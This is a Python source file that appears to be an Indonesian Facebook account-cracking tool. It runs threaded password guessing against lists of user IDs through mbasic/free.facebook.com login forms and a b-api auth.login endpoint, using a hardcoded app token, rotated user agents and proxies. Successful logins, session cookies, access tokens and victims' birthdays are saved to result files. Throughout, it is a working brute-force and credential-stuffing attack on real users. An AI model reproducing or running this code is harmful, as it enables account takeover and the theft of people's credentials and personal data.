# hallo bro :v

from modul import *
from .useragent import *
from .proxylistt import *
from .list_pass import pw_list
from datetime import datetime
import concurrent.futures
import urllib.request
import random

if os.path.exists("saya_gans/ngewe/.useragent"):
	if os.path.getsize("saya_gans/ngewe/.useragent")!=0:
		ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg=open("saya_gans/ngewe/.useragent").read().strip()

ok,cp,cout,live,chek,kumpul,lahir=0,0,0,[],[],[],""

class crack:
	def __init__(self,url,user):
		
		print()
		self.url=url
		self.user=user
		self.token=open("cookies/token.txt").read() if os.path.exists("cookies/token.txt") else None
		self.naroskeun()

	def naroskeun(self):
		NAROSKEUN=input("\033[0;34m╠═\033[0;33mPASWORD MANUAL[Y/T]\033[0;32m⋙")
		while NAROSKEUN in (""," "):
			print("\033[0;31m╚═PASWORD KOSONG")
			NAROSKEUN=input("\033[0;34m╠═\033[0;33mPASWORD MANUAL[Y/T]\033[0;32m⋙")
		if NAROSKEUN in tuple("yY"):
			password=input("\033[0;32m╠═\033[0;33mPASWORD\033[0;34m⋙")
			while len(password) < 6:
				print("\033[0;31m╠═PASWORD KOSONG" if password in (""," ") else "\033[0;31m╠═PASWORD HARUS 6 KARKTER")
				password=input("\033[0;32m╠═\033[0;33mPASWORD\033[0;34m⋙")
			print("\033[0;34m╠═\033[0;35mLOGIN DENGGAN")
			print("\033[0;34m╠═\033[0;31mMF. \033[0;33mFREE \033[0;34mFACEBOOK")
			print("\033[0;34m╠═\033[0;31mMB. \033[0;33mMBASIC \033[0;34mFACEBOOK")
			print("\033[0;34m╠═\033[0;31mMS. \033[0;33mAPI FREE \033[0;34mFACEBOOK")
			print("\033[0;34m╠═\033[0;31mMA. \033[0;33mAPI MBASIC \033[0;34mFACEBOOK")
			self.awokawok_ngentod(password)
		if NAROSKEUN in tuple("tT"):
			print("\033[0;34m╠═\033[0;35mLOGIN DENGGAN")
			print("\033[0;34m╠═\033[0;31mMF. \033[0;33mFREE \033[0;34mFACEBOOK")
			print("\033[0;34m╠═\033[0;31mMB. \033[0;33mMBASIC \033[0;34mFACEBOOK")
			print("\033[0;34m╠═\033[0;31mMS. \033[0;33mAPI FREE \033[0;34mFACEBOOK")
			print("\033[0;34m╠═\033[0;31mMA. \033[0;33mAPI MBASIC \033[0;34mFACEBOOK")
			self.awokawok_ngentod()
		else:
			print("\033[0;31m╠═PILIHAN KOSONG");self.naroskeun()
	
	def lovyu(self,username,password,url,**data):
		ses=req.session()
		respon=ses.get(url+"/login/?next&ref=dbl&fl&refid=8")
		parsing=parser(respon.text,"html.parser")
		action=parsing.find("form",{"method":"post"})["action"]
		kecuali=["sign_up","_fb_noscript"]
		for INPUT in parsing.find_all("input",{"name":True,"value":True}):
			if INPUT["name"] in kecuali:
				continue
			else:
				data.update({INPUT["name"]:INPUT["value"]})
		data.update({"email":username,"pass":password})
		ses.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg,"content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","referer":url+"/login/?next&ref=dbl&fl&refid=8"})
		ses.post(url+action,data=data,proxies=dict(http=proxsi),allow_redirects=False)
		return ses.cookies.get_dict()
	
	def api(self,username,password,url,**data):
		ses=req.session()
		ses.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","referer":url+"/login.php","user-agent":ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg})
		data.update({"email":username,"pass":password,"login":"submit"})
		ses.post(url+"/login.php",data=data,proxies=dict(http=proxsi),allow_redirects=False)
		return ses.cookies.get_dict()

	def bapi(self,username,password):
		ses=req.session()
		ses.headers.update({"x-fb-connection-bandwidth":str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni":str(random.randint(20000, 40000)),"x-fb-net-hni":str(random.randint(20000, 40000)),"x-fb-connection-quality":"EXCELLENT","x-fb-connection-type":"cell.CTRadioAccessTechnologyHSDPA","user-agent":ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg,"content-type":"application/x-www-form-urlencoded","x-fb-http-engine":"Liger"})
		ses.params.update({"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format":"JSON","sdk_version":"2","email":username,"locale":"en_US","password":password,"sdk":"ios","generate_session_cookies":"1","sig":"3f555f99fb61fcd7aa0c44f58f522ef6"})
		return ses.get("https://b-api.facebook.com/method/auth.login").json()
	
	def awokawok_ngentod(self,manual=None):
		pilih=input("\033[0;34m╠═\033[0;33mPILIH\033[0;34m⋙")
		while pilih in (""," "):
			print("\033[0;31m╠═PILIHAN KOSONG")
			pilih=input("\033[0;34m╠═\033[0;33mPILIH\033[0;34m⋙")
		url="https://{}.facebook.com"
		speed=40 if manual is None else 30
		if speed==30:
			speed=40 if len(manual.split(",")) <= 5 else 30
		if pilih in ("gg","gg"):
			print(" * token found :D" if self.token else " ! token not found")
			tod=self.awikwok()
			self.attack(self.bapi,speed,manual,url,tod)
			self.result()
		if pilih in ("mf","MF"):
			print("\033[0;32m╠═TTL MUNCUL" if self.token else "\033[0;31m╠═TTL TIDAK MUNCUL")
			tod=self.awikwok()
			self.attack(self.lovyu,speed,manual,url.format("free"),tod)
			self.result()
		if pilih in ("mb","MB"):
			print("\033[0;32m╠═TTL MUNCUL" if self.token else "\033[0;31m╠═TTL TIDAK MUNCUL")
			tod=self.awikwok()
			self.attack(self.lovyu,speed,manual,url.format("mbasic"),tod)
			self.result()
		if pilih in ("ms","MS"):
			print("\033[0;32m╠═TTL MUNCUL" if self.token else "\033[0;31m╠═TTL TIDAK MUNCUL")
			tod=self.awikwok()
			self.attack(self.api,speed,manual,url.format("free"),tod)
			self.result()
		if pilih in ("ma","MA"):
			print("\033[0;32m╠═TTL MUNCUL" if self.token else "\033[0;31m╠═TTL TIDAK MUNCUL")
			tod=self.awikwok()
			self.attack(self.api,speed,manual,url.format("mbasic"),tod)
			self.result()
		else:
			print("\033[0;31m╠═PILIHAN TIDAK ADA");self.awokawok_ngentod(manual)
			
	def attack(self,login,speed,password,url,tolol):
		for pengguna in self.user:
			membagi=pengguna.split("(Aap Gans)")
			if password:
				if "first" in password:
					if len(membagi[1].split(" "))!=0:
						kumpul.append({"username":membagi[0],"password":password.replace("first",membagi[1].split(" ")[0].lower()).split(",")})
				else:
					kumpul.append({"username":membagi[0],"password":password.split(",")})
			else:
				kumpul.append({"username":membagi[0],"password":pw_list(membagi,login)})
		print("\033[0;36m╚═\033[0;34mCTRL+Z \033[0;31mSTOP\n")
		with concurrent.futures.ThreadPoolExecutor(max_workers=speed) as U:
			if "bapi" in str(login):
				for x in kumpul:
					U.submit(self.log_bapics,x["username"],x["password"],login,tolol)
			else:
				for x in kumpul:
					U.submit(self.log_mbasic,x["username"],x["password"],login,url,tolol)

	def log_mbasic(self,username,list_password,login,url,ttl):
		try:
			global ok,cp,cout,lahir
			for password in list_password:
				rincian=login(username,password,url)
				if "c_user" in rincian:
					ok+=1
					(lambda cookies,uid: self.save(f"\x1b[1;32m[OK]> {uid}|{password}\n\033[0;34mhttps://www.facebook.com/{uid}","result/live.txt",live))((lambda: ";".join([_+"="+__ for _,__ in rincian.items()]))(),rincian['c_user']);break
				if "checkpoint" in rincian:
					cp+=1
					uid=json.loads(urllib.request.unquote(rincian["checkpoint"]))["u"]
					if ttl:
						lahir=req.get("https://graph.facebook.com/{}/?access_token={}".format(str(uid),self.token)).json()
						lahir="|"+lahir["birthday"] if "birthday" in lahir else ""
					self.save(f"\x1b[1;33m[CP]> {uid}|{password}{lahir}\n\033[0;31mhttps://www.facebook.com/{uid}","result/chek.txt",chek);break
				else:
					continue
			cout+=1
			print(f"\r \033[0;34mCRACK {cout}/{len(self.user)} \033[0;32mOK-{ok} \033[0;31mCP-{cp}",end="")
		except:
			self.log_mbasic(username,list_password,login,url,ttl)

	def log_bapics(self,username,list_password,login,ttl):
		try:
			global ok,cp,cout,lahir
			for password in list_password:
				rincian=login(username,password)
				if "session_key" in str(rincian) and "EAAA" in str(rincian):
					ok+=10
					(lambda token,uid:self.save(f"\x1b[1;32m*--> {uid}|{password}|{token}","result/live.txt",live))(rincian["access_token"],rincian["uid"]);break
				if "www.facebook.com" in rincian["error_msg"]:
					cp+=1
					uid=username
					if "request_args" in rincian:
						# menghindari nyasar maybe :v
						for x in rincian["request_args"]:
							if "email" in x["key"]:
								uid=x["value"];break
					if ttl:
						lahir=req.get("https://graph.facebook.com/{}/?access_token={}".format(str(uid),self.token)).json()
						lahir="|"+lahir["birthday"] if "birthday" in lahir else ""
					self.save(f"\x1b[1;33m*--> {uid}|{password}{lahir}","result/chek.txt",chek);break
				else:
					continue
			cout+=1
			print(f"\r * crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
		except:
			self.log_bapics(username,list_password,login,ttl)
				
	def save(self,*memek):
		view=memek[0]
		print(f"\r {view}\x1b[0m\n",end="")
		open(memek[1],"a").write(re.findall("> (.+)",view)[0]+"\n")
		memek[2].append(view)

	def result(self):
		if len(live)!=0 or len(chek)!=0:
			print(f"\n\n \033[0;32mOK\033[0;34m/\033[0;31mCP \033[0;32m {len(live)}\033[0;34m/\033[0;31m {len(chek)}")
			if len(live)!=0:
				print("\033[0;32mSUKSES")
			if len(chek)!=0:
				print("\033[0;31mCEK MAS BRO")
			exit()
		else:
			exit("\n\n \033[0;31mSORY NO RESULT")

	def awikwok(self):
		if self.token:
			n=input("\033[0;34m╠═\033[0;33mCRACK TTL [Y/T]\033[0;34m⋙")
			if n in tuple("yY"):
				return True
			if n in tuple("tT"):
				return False
			else:
				print("\033[0;31m╠═PILIHAN TIDAK ADA")
				return self.awikwok()
